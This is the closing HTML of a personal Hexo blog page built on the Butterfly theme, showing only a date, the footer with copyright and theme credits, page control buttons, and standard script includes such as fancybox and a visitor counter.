12:29:39">2024-10-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/8a5725b44b17e750ba6ce84aaca3013d.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 何方圜</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
